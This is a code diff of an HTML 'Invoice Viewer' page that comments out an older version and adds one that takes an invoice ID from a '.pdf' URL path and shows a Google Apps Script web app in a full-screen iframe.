@@ -59,7 +59,7 @@
 </html> -->
 
 
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html>
 <head>
 <title>Invoice Viewer</title>
@@ -120,7 +120,56 @@
 
 
 </body>
+</html> -->
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Invoice Viewer</title>
+<style>
+  iframe {
+    position: fixed;
+    top: 0;
+    left: 0;
+    border: none;
+    width: 100vw;
+    height: 100vh;
+  }
+</style>
+</head>
+<body>
+
+<iframe id="myIframe" src=""></iframe>
+
+<script>
+  function getInvoiceIdFromURL() {
+    const path = window.location.pathname;    
+    const parts = path.split("/");            
+    const lastPart = parts[parts.length - 1];  
+
+    if (!lastPart.endsWith(".pdf")) return null;
+
+    return lastPart.replace(".pdf", ""); 
+  }
+
+  window.onload = function () {
+    const invoiceId = getInvoiceIdFromURL();
+
+    if (!invoiceId) {
+      alert("Invalid Invoice URL!");
+      return;
+    }
+
+    const baseUrl = "https://script.google.com/macros/s/AKfycbyZWEaQ6Hn46N1ydBpNFKIeKQcrVYRx5D6MTfT6LL0JfsVdK4B4Z0gCZfUogUGpssr_/exec";
+
+    const iframeUrl = `${baseUrl}?invoiceId=${encodeURIComponent(invoiceId)}`;
+    document.getElementById("myIframe").src = iframeUrl;
+  };
+</script>
+
+</body>
 </html>
+
 
 
 
